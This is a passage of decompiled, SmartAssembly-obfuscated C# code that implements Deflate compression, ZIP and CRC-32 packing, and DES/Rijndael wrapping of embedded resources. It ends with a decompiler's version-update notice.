						\u0013 = \u0002;
						num4 = num3;
						num5 = num3 - \u0017;
						if (num5 >= num2)
						{
							break;
						}
						b = \u0019[num4 - 1];
						b2 = \u0019[num4];
					}
					num3 = \u0017;
				}
				while ((\u0002 = array[\u0002 & 0x7FFF] & 0xFFFF) > num6 && --num != 0);
				\u0014 = Math.Min(num5, \u0018);
				return \u0014 >= 3;
			}

			private bool \u0001(bool \u0002, bool \u0003)
			{
				if (\u0018 < 262 && !\u0002)
				{
					return false;
				}
				while (\u0018 >= 262 || \u0002)
				{
					if (\u0018 == 0)
					{
						if (\u0015)
						{
							\u001f.\u0001(\u0019[\u0017 - 1] & 0xFF);
						}
						\u0015 = false;
						\u001f.\u0002(\u0019, \u0016, \u0017 - \u0016, \u0003);
						\u0016 = \u0017;
						return false;
					}
					if (\u0017 >= 65274)
					{
						this.\u0002();
					}
					int num = \u0013;
					int num2 = \u0014;
					if (\u0018 >= 3)
					{
						int num3 = \u0001();
						if (num3 != 0 && \u0017 - num3 <= 32506 && \u0001(num3) && \u0014 <= 5 && \u0014 == 3 && \u0017 - \u0013 > 4096)
						{
							\u0014 = 2;
						}
					}
					if (num2 >= 3 && \u0014 <= num2)
					{
						\u001f.\u0001(\u0017 - 1 - num, num2);
						num2 -= 2;
						do
						{
							\u0017++;
							\u0018--;
							if (\u0018 >= 3)
							{
								\u0001();
							}
						}
						while (--num2 > 0);
						\u0017++;
						\u0018--;
						\u0015 = false;
						\u0014 = 2;
					}
					else
					{
						if (\u0015)
						{
							\u001f.\u0001(\u0019[\u0017 - 1] & 0xFF);
						}
						\u0015 = true;
						\u0017++;
						\u0018--;
					}
					if (\u001f.\u0001())
					{
						int num4 = \u0017 - \u0016;
						if (\u0015)
						{
							num4--;
						}
						bool flag = \u0003 && \u0018 == 0 && !\u0015;
						\u001f.\u0002(\u0019, \u0016, num4, flag);
						\u0016 += num4;
						return !flag;
					}
				}
				return true;
			}

			public bool \u0002(bool \u0002, bool \u0003)
			{
				bool flag2;
				do
				{
					this.\u0003();
					bool flag = \u0002 && \u001c == \u001d;
					flag2 = \u0001(flag, \u0003);
				}
				while (\u001e.IsFlushed && flag2);
				return flag2;
			}

			public void \u0001(byte[] \u0002)
			{
				\u001a = \u0002;
				\u001c = 0;
				\u001d = \u0002.Length;
			}

			public bool \u0001()
			{
				return \u001d == \u001c;
			}
		}

		internal class \u000e
		{
			protected byte[] \u0001 = new byte[65536];

			private int \u0002;

			private int \u0003;

			private uint \u0004;

			private int \u0005;

			public int BitCount => \u0005;

			public bool IsFlushed => \u0003 == 0;

			public void \u0001(int \u0002)
			{
				this.\u0001[\u0003++] = (byte)\u0002;
				this.\u0001[\u0003++] = (byte)(\u0002 >> 8);
			}

			public void \u0001(byte[] \u0002, int \u0003, int \u0004)
			{
				Array.Copy(\u0002, \u0003, this.\u0001, this.\u0003, \u0004);
				this.\u0003 += \u0004;
			}

			public void \u0001()
			{
				if (\u0005 > 0)
				{
					this.\u0001[\u0003++] = (byte)\u0004;
					if (\u0005 > 8)
					{
						this.\u0001[\u0003++] = (byte)(\u0004 >> 8);
					}
				}
				\u0004 = 0u;
				\u0005 = 0;
			}

			public void \u0001(int \u0002, int \u0003)
			{
				\u0004 |= (uint)(\u0002 << \u0005);
				\u0005 += \u0003;
				if (\u0005 >= 16)
				{
					this.\u0001[this.\u0003++] = (byte)\u0004;
					this.\u0001[this.\u0003++] = (byte)(\u0004 >> 8);
					\u0004 >>= 16;
					\u0005 -= 16;
				}
			}

			public int \u0001(byte[] \u0002, int \u0003, int \u0004)
			{
				if (\u0005 >= 8)
				{
					this.\u0001[this.\u0003++] = (byte)this.\u0004;
					this.\u0004 >>= 8;
					\u0005 -= 8;
				}
				if (\u0004 > this.\u0003 - this.\u0002)
				{
					\u0004 = this.\u0003 - this.\u0002;
					Array.Copy(this.\u0001, this.\u0002, \u0002, \u0003, \u0004);
					this.\u0002 = 0;
					this.\u0003 = 0;
				}
				else
				{
					Array.Copy(this.\u0001, this.\u0002, \u0002, \u0003, \u0004);
					this.\u0002 += \u0004;
				}
				return \u0004;
			}
		}

		internal class \u000f : MemoryStream
		{
			public void \u0001(int \u0002)
			{
				WriteByte((byte)(\u0002 & 0xFF));
				WriteByte((byte)((\u0002 >> 8) & 0xFF));
			}

			public void \u0002(int \u0002)
			{
				\u0001(\u0002);
				\u0001(\u0002 >> 16);
			}

			public int \u0001()
			{
				return ReadByte() | (ReadByte() << 8);
			}

			public int \u0002()
			{
				return \u0001() | (\u0001() << 16);
			}

			public \u000f()
			{
			}

			public \u000f(byte[] buffer)
				: base(buffer, writable: false)
			{
			}
		}

		public static string \u0001;

		private static bool \u0001(Assembly \u0002, Assembly \u0003)
		{
			byte[] publicKey = \u0002.GetName().GetPublicKey();
			byte[] publicKey2 = \u0003.GetName().GetPublicKey();
			if (publicKey2 == null != (publicKey == null))
			{
				return false;
			}
			if (publicKey2 != null)
			{
				for (int i = 0; i < publicKey2.Length; i++)
				{
					if (publicKey2[i] != publicKey[i])
					{
						return false;
					}
				}
			}
			return true;
		}

		private static ICryptoTransform \u0001(byte[] \u0002, byte[] \u0003, bool \u0004)
		{
			using SymmetricAlgorithm symmetricAlgorithm = new RijndaelManaged();
			return \u0004 ? symmetricAlgorithm.CreateDecryptor(\u0002, \u0003) : symmetricAlgorithm.CreateEncryptor(\u0002, \u0003);
		}

		private static ICryptoTransform \u0002(byte[] \u0002, byte[] \u0003, bool \u0004)
		{
			using DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
			return \u0004 ? dESCryptoServiceProvider.CreateDecryptor(\u0002, \u0003) : dESCryptoServiceProvider.CreateEncryptor(\u0002, \u0003);
		}

		public static byte[] \u0001(byte[] \u0002)
		{
			Assembly callingAssembly = Assembly.GetCallingAssembly();
			Assembly executingAssembly = Assembly.GetExecutingAssembly();
			if ((object)callingAssembly != executingAssembly && !\u0001(executingAssembly, callingAssembly))
			{
				return null;
			}
			\u000f obj = new \u000f(\u0002);
			byte[] array = new byte[0];
			int num = obj.\u0002();
			if (num == 67324752)
			{
				short num2 = (short)obj.\u0001();
				int num3 = obj.\u0001();
				int num4 = obj.\u0001();
				if (num != 67324752 || num2 != 20 || num3 != 0 || num4 != 8)
				{
					throw new FormatException("Wrong Header Signature");
				}
				obj.\u0002();
				obj.\u0002();
				obj.\u0002();
				int num5 = obj.\u0002();
				int num6 = obj.\u0001();
				int num7 = obj.\u0001();
				if (num6 > 0)
				{
					byte[] buffer = new byte[num6];
					obj.Read(buffer, 0, num6);
				}
				if (num7 > 0)
				{
					byte[] buffer2 = new byte[num7];
					obj.Read(buffer2, 0, num7);
				}
				byte[] array2 = new byte[obj.Length - obj.Position];
				obj.Read(array2, 0, array2.Length);
				\u0001 obj2 = new \u0001(array2);
				array = new byte[num5];
				obj2.\u0001(array, 0, array.Length);
				array2 = null;
			}
			else
			{
				int num8 = num >> 24;
				num -= num8 << 24;
				if (num != 8223355)
				{
					throw new FormatException("Unknown Header");
				}
				if (num8 == 1)
				{
					int num9 = obj.\u0002();
					array = new byte[num9];
					int num11;
					for (int i = 0; i < num9; i += num11)
					{
						int num10 = obj.\u0002();
						num11 = obj.\u0002();
						byte[] array3 = new byte[num10];
						obj.Read(array3, 0, array3.Length);
						\u0001 obj3 = new \u0001(array3);
						obj3.\u0001(array, i, num11);
					}
				}
				if (num8 == 2)
				{
					byte[] array4 = new byte[8] { 147, 48, 197, 78, 72, 144, 51, 204 };
					byte[] array5 = new byte[8] { 52, 10, 190, 165, 81, 193, 2, 156 };
					using ICryptoTransform cryptoTransform = global::\u0006.\u0004.\u0002(array4, array5, \u0004: true);
					byte[] array6 = cryptoTransform.TransformFinalBlock(\u0002, 4, \u0002.Length - 4);
					array = \u0001(array6);
				}
				if (num8 == 3)
				{
					byte[] array7 = new byte[16]
					{
						1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
						1, 1, 1, 1, 1, 1
					};
					byte[] array8 = new byte[16]
					{
						2, 2, 2, 2, 2, 2, 2, 2, 2, 2,
						2, 2, 2, 2, 2, 2
					};
					using ICryptoTransform cryptoTransform2 = \u0001(array7, array8, \u0004: true);
					byte[] array9 = cryptoTransform2.TransformFinalBlock(\u0002, 4, \u0002.Length - 4);
					array = \u0001(array9);
				}
			}
			obj.Close();
			obj = null;
			return array;
		}

		public static byte[] \u0002(byte[] \u0002)
		{
			return \u0001(\u0002, 1, null, null);
		}

		public static byte[] \u0001(byte[] \u0002, byte[] \u0003, byte[] \u0004)
		{
			return \u0001(\u0002, 2, \u0003, \u0004);
		}

		public static byte[] \u0002(byte[] \u0002, byte[] \u0003, byte[] \u0004)
		{
			return \u0001(\u0002, 3, \u0003, \u0004);
		}

		private static byte[] \u0001(byte[] \u0002, int \u0003, byte[] \u0004, byte[] \u0005)
		{
			try
			{
				\u000f obj = new \u000f();
				switch (\u0003)
				{
				case 0:
				{
					\u0006 obj3 = new \u0006();
					DateTime now = DateTime.Now;
					long num3 = (uint)((((now.Year - 1980) & 0x7F) << 25) | (now.Month << 21) | (now.Day << 16) | (now.Hour << 11) | (now.Minute << 5) | (now.Second >>> 1));
					uint[] array8 = new uint[256]
					{
						0u, 1996959894u, 3993919788u, 2567524794u, 124634137u, 1886057615u, 3915621685u, 2657392035u, 249268274u, 2044508324u,
						3772115230u, 2547177864u, 162941995u, 2125561021u, 3887607047u, 2428444049u, 498536548u, 1789927666u, 4089016648u, 2227061214u,
						450548861u, 1843258603u, 4107580753u, 2211677639u, 325883990u, 1684777152u, 4251122042u, 2321926636u, 335633487u, 1661365465u,
						4195302755u, 2366115317u, 997073096u, 1281953886u, 3579855332u, 2724688242u, 1006888145u, 1258607687u, 3524101629u, 2768942443u,
						901097722u, 1119000684u, 3686517206u, 2898065728u, 853044451u, 1172266101u, 3705015759u, 2882616665u, 651767980u, 1373503546u,
						3369554304u, 3218104598u, 565507253u, 1454621731u, 3485111705u, 3099436303u, 671266974u, 1594198024u, 3322730930u, 2970347812u,
						795835527u, 1483230225u, 3244367275u, 3060149565u, 1994146192u, 31158534u, 2563907772u, 4023717930u, 1907459465u, 112637215u,
						2680153253u, 3904427059u, 2013776290u, 251722036u, 2517215374u, 3775830040u, 2137656763u, 141376813u, 2439277719u, 3865271297u,
						1802195444u, 476864866u, 2238001368u, 4066508878u, 1812370925u, 453092731u, 2181625025u, 4111451223u, 1706088902u, 314042704u,
						2344532202u, 4240017532u, 1658658271u, 366619977u, 2362670323u, 4224994405u, 1303535960u, 984961486u, 2747007092u, 3569037538u,
						1256170817u, 1037604311u, 2765210733u, 3554079995u, 1131014506u, 879679996u, 2909243462u, 3663771856u, 1141124467u, 855842277u,
						2852801631u, 3708648649u, 1342533948u, 654459306u, 3188396048u, 3373015174u, 1466479909u, 544179635u, 3110523913u, 3462522015u,
						1591671054u, 702138776u, 2966460450u, 3352799412u, 1504918807u, 783551873u, 3082640443u, 3233442989u, 3988292384u, 2596254646u,
						62317068u, 1957810842u, 3939845945u, 2647816111u, 81470997u, 1943803523u, 3814918930u, 2489596804u, 225274430u, 2053790376u,
						3826175755u, 2466906013u, 167816743u, 2097651377u, 4027552580u, 2265490386u, 503444072u, 1762050814u, 4150417245u, 2154129355u,
						426522225u, 1852507879u, 4275313526u, 2312317920u, 282753626u, 1742555852u, 4189708143u, 2394877945u, 397917763u, 1622183637u,
						3604390888u, 2714866558u, 953729732u, 1340076626u, 3518719985u, 2797360999u, 1068828381u, 1219638859u, 3624741850u, 2936675148u,
						906185462u, 1090812512u, 3747672003u, 2825379669u, 829329135u, 1181335161u, 3412177804u, 3160834842u, 628085408u, 1382605366u,
						3423369109u, 3138078467u, 570562233u, 1426400815u, 3317316542u, 2998733608u, 733239954u, 1555261956u, 3268935591u, 3050360625u,
						752459403u, 1541320221u, 2607071920u, 3965973030u, 1969922972u, 40735498u, 2617837225u, 3943577151u, 1913087877u, 83908371u,
						2512341634u, 3803740692u, 2075208622u, 213261112u, 2463272603u, 3855990285u, 2094854071u, 198958881u, 2262029012u, 4057260610u,
						1759359992u, 534414190u, 2176718541u, 4139329115u, 1873836001u, 414664567u, 2282248934u, 4279200368u, 1711684554u, 285281116u,
						2405801727u, 4167216745u, 1634467795u, 376229701u, 2685067896u, 3608007406u, 1308918612u, 956543938u, 2808555105u, 3495958263u,
						1231636301u, 1047427035u, 2932959818u, 3654703836u, 1088359270u, 936918000u, 2847714899u, 3736837829u, 1202900863u, 817233897u,
						3183342108u, 3401237130u, 1404277552u, 615818150u, 3134207493u, 3453421203u, 1423857449u, 601450431u, 3009837614u, 3294710456u,
						1567103746u, 711928724u, 3020668471u, 3272380065u, 1510334235u, 755167117u
					};
					uint num4 = uint.MaxValue;
					uint num5 = num4;
					int num6 = 0;
					int num7 = \u0002.Length;
					while (--num7 >= 0)
					{
						num5 = array8[(num5 ^ \u0002[num6++]) & 0xFF] ^ (num5 >> 8);
					}
					num5 ^= num4;
					obj.\u0002(67324752);
					obj.\u0001(20);
					obj.\u0001(0);
					obj.\u0001(8);
					obj.\u0002((int)num3);
					obj.\u0002((int)num5);
					long position3 = obj.Position;
					obj.\u0002(0);
					obj.\u0002(\u0002.Length);
					byte[] bytes = Encoding.UTF8.GetBytes("{data}");
					obj.\u0001(bytes.Length);
					obj.\u0001(0);
					obj.Write(bytes, 0, bytes.Length);
					obj3.\u0001(\u0002);
					while (!obj3.IsNeedingInput)
					{
						byte[] array9 = new byte[512];
						int num8 = obj3.\u0001(array9);
						if (num8 <= 0)
						{
							break;
						}
						obj.Write(array9, 0, num8);
					}
					obj3.\u0001();
					while (!obj3.IsFinished)
					{
						byte[] array10 = new byte[512];
						int num9 = obj3.\u0001(array10);
						if (num9 <= 0)
						{
							break;
						}
						obj.Write(array10, 0, num9);
					}
					long num10 = obj3.TotalOut;
					obj.\u0002(33639248);
					obj.\u0001(20);
					obj.\u0001(20);
					obj.\u0001(0);
					obj.\u0001(8);
					obj.\u0002((int)num3);
					obj.\u0002((int)num5);
					obj.\u0002((int)num10);
					obj.\u0002(\u0002.Length);
					obj.\u0001(bytes.Length);
					obj.\u0001(0);
					obj.\u0001(0);
					obj.\u0001(0);
					obj.\u0001(0);
					obj.\u0002(0);
					obj.\u0002(0);
					obj.Write(bytes, 0, bytes.Length);
					obj.\u0002(101010256);
					obj.\u0001(0);
					obj.\u0001(0);
					obj.\u0001(1);
					obj.\u0001(1);
					obj.\u0002(46 + bytes.Length);
					obj.\u0002((int)(30 + bytes.Length + num10));
					obj.\u0001(0);
					obj.Seek(position3, SeekOrigin.Begin);
					obj.\u0002((int)num10);
					break;
				}
				case 1:
				{
					obj.\u0002(25000571);
					obj.\u0002(\u0002.Length);
					byte[] array5;
					for (int i = 0; i < \u0002.Length; i += array5.Length)
					{
						array5 = new byte[Math.Min(2097151, \u0002.Length - i)];
						Buffer.BlockCopy(\u0002, i, array5, 0, array5.Length);
						long position = obj.Position;
						obj.\u0002(0);
						obj.\u0002(array5.Length);
						\u0006 obj2 = new \u0006();
						obj2.\u0001(array5);
						while (!obj2.IsNeedingInput)
						{
							byte[] array6 = new byte[512];
							int num = obj2.\u0001(array6);
							if (num <= 0)
							{
								break;
							}
							obj.Write(array6, 0, num);
						}
						obj2.\u0001();
						while (!obj2.IsFinished)
						{
							byte[] array7 = new byte[512];
							int num2 = obj2.\u0001(array7);
							if (num2 <= 0)
							{
								break;
							}
							obj.Write(array7, 0, num2);
						}
						long position2 = obj.Position;
						obj.Position = position;
						obj.\u0002((int)obj2.TotalOut);
						obj.Position = position2;
					}
					break;
				}
				case 2:
				{
					obj.\u0002(41777787);
					byte[] array3 = \u0001(\u0002, 1, null, null);
					using (ICryptoTransform cryptoTransform2 = global::\u0006.\u0004.\u0002(\u0004, \u0005, \u0004: false))
					{
						byte[] array4 = cryptoTransform2.TransformFinalBlock(array3, 0, array3.Length);
						obj.Write(array4, 0, array4.Length);
					}
					break;
				}
				case 3:
				{
					obj.\u0002(58555003);
					byte[] array = \u0001(\u0002, 1, null, null);
					using (ICryptoTransform cryptoTransform = \u0001(\u0004, \u0005, \u0004: false))
					{
						byte[] array2 = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
						obj.Write(array2, 0, array2.Length);
					}
					break;
				}
				}
				obj.Flush();
				obj.Close();
				return obj.ToArray();
			}
			catch (Exception ex)
			{
				global::\u0006.\u0004.\u0001 = "ERR 2003: " + ex.Message;
				throw;
			}
		}
	}
}
namespace \u000f
{
	[CompilerGenerated]
	internal class \u0002
	{
		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 16)]
		private struct \u0001
		{
		}

		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 1024)]
		private struct \u0002
		{
		}

		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 116)]
		private struct \u0003
		{
		}

		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 120)]
		private struct \u0004
		{
		}

		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 12)]
		private struct \u0005
		{
		}

		[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 76)]
		private struct \u0006
		{
		}

		internal static long \u0001/* Not supported: data(93 30 C5 4E 48 90 33 CC) */;

		internal static long \u0002/* Not supported: data(34 0A BE A5 51 C1 02 9C) */;

		internal static \u0001 \u0003/* Not supported: data(01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01) */;

		internal static \u0001 \u0004/* Not supported: data(02 02 02 02 02 02 02 02 02 02 02 02 02 02 02 02) */;

		internal static \u0002 \u0005/* Not supported: data(00 00 00 00 96 30 07 77 2C 61 0E EE BA 51 09 99 19 C4 6D 07 8F F4 6A 70 35 A5 63 E9 A3 95 64 9E 32 88 DB 0E A4 B8 DC 79 1E E9 D5 E0 88 D9 D2 97 2B 4C B6 09 BD 7C B1 7E 07 2D B8 E7 91 1D BF 90 64 10 B7 1D F2 20 B0 6A 48 71 B9 F3 DE 41 BE 84 7D D4 DA 1A EB E4 DD 6D 51 B5 D4 F4 C7 85 D3 83 56 98 6C 13 C0 A8 6B 64 7A F9 62 FD EC C9 65 8A 4F 5C 01 14 D9 6C 06 63 63 3D 0F FA F5 0D 08 8D C8 20 6E 3B 5E 10 69 4C E4 41 60 D5 72 71 67 A2 D1 E4 03 3C 47 D4 04 4B FD 85 0D D2 6B B5 0A A5 FA A8 B5 35 6C 98 B2 42 D6 C9 BB DB 40 F9 BC AC E3 6C D8 32 75 5C DF 45 CF 0D D6 DC 59 3D D1 AB AC 30 D9 26 3A 00 DE 51 80 51 D7 C8 16 61 D0 BF B5 F4 B4 21 23 C4 B3 56 99 95 BA CF 0F A5 BD B8 9E B8 02 28 08 88 05 5F B2 D9 0C C6 24 E9 0B B1 87 7C 6F 2F 11 4C 68 58 AB 1D 61 C1 3D 2D 66 B6 90 41 DC 76 06 71 DB 01 BC 20 D2 98 2A 10 D5 EF 89 85 B1 71 1F B5 B6 06 A5 E4 BF 9F 33 D4 B8 E8 A2 C9 07 78 34 F9 00 0F 8E A8 09 96 18 98 0E E1 BB 0D 6A 7F 2D 3D 6D 08 97 6C 64 91 01 5C 63 E6 F4 51 6B 6B 62 61 6C 1C D8 30 65 85 4E 00 62 F2 ED 95 06 6C 7B A5 01 1B C1 F4 08 82 57 C4 0F F5 C6 D9 B0 65 50 E9 B7 12 EA B8 BE 8B 7C 88 B9 FC DF 1D DD 62 49 2D DA 15 F3 7C D3 8C 65 4C D4 FB 58 61 B2 4D CE 51 B5 3A 74 00 BC A3 E2 30 BB D4 41 A5 DF 4A D7 95 D8 3D 6D C4 D1 A4 FB F4 D6 D3 6A E9 69 43 FC D9 6E 34 46 88 67 AD D0 B8 60 DA 73 2D 04 44 E5 1D 03 33 5F 4C 0A AA C9 7C 0D DD 3C 71 05 50 AA 41 02 27 10 10 0B BE 86 20 0C C9 25 B5 68 57 B3 85 6F 20 09 D4 66 B9 9F E4 61 CE 0E F9 DE 5E 98 C9 D9 29 22 98 D0 B0 B4 A8 D7 C7 17 3D B3 59 81 0D B4 2E 3B 5C BD B7 AD 6C BA C0 20 83 B8 ED B6 B3 BF 9A 0C E2 B6 03 9A D2 B1 74 39 47 D5 EA AF 77 D2 9D 15 26 DB 04 83 16 DC 73 12 0B 63 E3 84 3B 64 94 3E 6A 6D 0D A8 5A 6A 7A 0B CF 0E E4 9D FF 09 93 27 AE 00 0A B1 9E 07 7D 44 93 0F F0 D2 A3 08 87 68 F2 01 1E FE C2 06 69 5D 57 62 F7 CB 67 65 80 71 36 6C 19 E7 06 6B 6E 76 1B D4 FE E0 2B D3 89 5A 7A DA 10 CC 4A DD 67 6F DF B9 F9 F9 EF BE 8E 43 BE B7 17 D5 8E B0 60 E8 A3 D6 D6 7E 93 D1 A1 C4 C2 D8 38 52 F2 DF 4F F1 67 BB D1 67 57 BC A6 DD 06 B5 3F 4B 36 B2 48 DA 2B 0D D8 4C 1B 0A AF F6 4A 03 36 60 7A 04 41 C3 EF 60 DF 55 DF 67 A8 EF 8E 6E 31 79 BE 69 46 8C B3 61 CB 1A 83 66 BC A0 D2 6F 25 36 E2 68 52 95 77 0C CC 03 47 0B BB B9 16 02 22 2F 26 05 55 BE 3B BA C5 28 0B BD B2 92 5A B4 2B 04 6A B3 5C A7 FF D7 C2 31 CF D0 B5 8B 9E D9 2C 1D AE DE 5B B0 C2 64 9B 26 F2 63 EC 9C A3 6A 75 0A 93 6D 02 A9 06 09 9C 3F 36 0E EB 85 67 07 72 13 57 00 05 82 4A BF 95 14 7A B8 E2 AE 2B B1 7B 38 1B B6 0C 9B 8E D2 92 0D BE D5 E5 B7 EF DC 7C 21 DF DB 0B D4 D2 D3 86 42 E2 D4 F1 F8 B3 DD 68 6E 83 DA 1F CD 16 BE 81 5B 26 B9 F6 E1 77 B0 6F 77 47 B7 18 E6 5A 08 88 70 6A 0F FF CA 3B 06 66 5C 0B 01 11 FF 9E 65 8F 69 AE 62 F8 D3 FF 6B 61 45 CF 6C 16 78 E2 0A A0 EE D2 0D D7 54 83 04 4E C2 B3 03 39 61 26 67 A7 F7 16 60 D0 4D 47 69 49 DB 77 6E 3E 4A 6A D1 AE DC 5A D6 D9 66 0B DF 40 F0 3B D8 37 53 AE BC A9 C5 9E BB DE 7F CF B2 47 E9 FF B5 30 1C F2 BD BD 8A C2 BA CA 30 93 B3 53 A6 A3 B4 24 05 36 D0 BA 93 06 D7 CD 29 57 DE 54 BF 67 D9 23 2E 7A 66 B3 B8 4A 61 C4 02 1B 68 5D 94 2B 6F 2A 37 BE 0B B4 A1 8E 0C C3 1B DF 05 5A 8D EF 02 2D) */;

		internal static \u0003 \u0006/* Not supported: data(03 00 00 00 04 00 00 00 05 00 00 00 06 00 00 00 07 00 00 00 08 00 00 00 09 00 00 00 0A 00 00 00 0B 00 00 00 0D 00 00 00 0F 00 00 00 11 00 00 00 13 00 00 00 17 00 00 00 1B 00 00 00 1F 00 00 00 23 00 00 00 2B 00 00 00 33 00 00 00 3B 00 00 00 43 00 00 00 53 00 00 00 63 00 00 00 73 00 00 00 83 00 00 00 A3 00 00 00 C3 00 00 00 E3 00 00 00 02 01 00 00) */;

		internal static \u0003 \u0007/* Not supported: data(00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 01 00 00 00 01 00 00 00 01 00 00 00 02 00 00 00 02 00 00 00 02 00 00 00 02 00 00 00 03 00 00 00 03 00 00 00 03 00 00 00 03 00 00 00 04 00 00 00 04 00 00 00 04 00 00 00 04 00 00 00 05 00 00 00 05 00 00 00 05 00 00 00 05 00 00 00 00 00 00 00) */;

		internal static \u0004 \u0008/* Not supported: data(01 00 00 00 02 00 00 00 03 00 00 00 04 00 00 00 05 00 00 00 07 00 00 00 09 00 00 00 0D 00 00 00 11 00 00 00 19 00 00 00 21 00 00 00 31 00 00 00 41 00 00 00 61 00 00 00 81 00 00 00 C1 00 00 00 01 01 00 00 81 01 00 00 01 02 00 00 01 03 00 00 01 04 00 00 01 06 00 00 01 08 00 00 01 0C 00 00 01 10 00 00 01 18 00 00 01 20 00 00 01 30 00 00 01 40 00 00 01 60 00 00) */;

		internal static \u0004 \u000e/* Not supported: data(00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 01 00 00 00 02 00 00 00 02 00 00 00 03 00 00 00 03 00 00 00 04 00 00 00 04 00 00 00 05 00 00 00 05 00 00 00 06 00 00 00 06 00 00 00 07 00 00 00 07 00 00 00 08 00 00 00 08 00 00 00 09 00 00 00 09 00 00 00 0A 00 00 00 0A 00 00 00 0B 00 00 00 0B 00 00 00 0C 00 00 00 0C 00 00 00 0D 00 00 00 0D 00 00 00) */;

		internal static \u0005 \u000f/* Not supported: data(03 00 00 00 03 00 00 00 0B 00 00 00) */;

		internal static \u0005 \u0010/* Not supported: data(02 00 00 00 03 00 00 00 07 00 00 00) */;

		internal static \u0006 \u0011/* Not supported: data(10 00 00 00 11 00 00 00 12 00 00 00 00 00 00 00 08 00 00 00 07 00 00 00 09 00 00 00 06 00 00 00 0A 00 00 00 05 00 00 00 0B 00 00 00 04 00 00 00 0C 00 00 00 03 00 00 00 0D 00 00 00 02 00 00 00 0E 00 00 00 01 00 00 00 0F 00 00 00) */;

		internal static \u0006 \u0012/* Not supported: data(10 00 00 00 11 00 00 00 12 00 00 00 00 00 00 00 08 00 00 00 07 00 00 00 09 00 00 00 06 00 00 00 0A 00 00 00 05 00 00 00 0B 00 00 00 04 00 00 00 0C 00 00 00 03 00 00 00 0D 00 00 00 02 00 00 00 0E 00 00 00 01 00 00 00 0F 00 00 00) */;

		internal static \u0001 \u0013/* Not supported: data(00 08 04 0C 02 0A 06 0E 01 09 05 0D 03 0B 07 0F) */;
	}
}
namespace SmartAssembly.Attributes
{
	public sealed class PoweredByAttribute : Attribute
	{
		public PoweredByAttribute(string P_0)
		{
		}
	}
}
You are not using the latest version of the tool, please update.
Latest version is '10.0.0.8330' (yours is '9.1.0.7988')
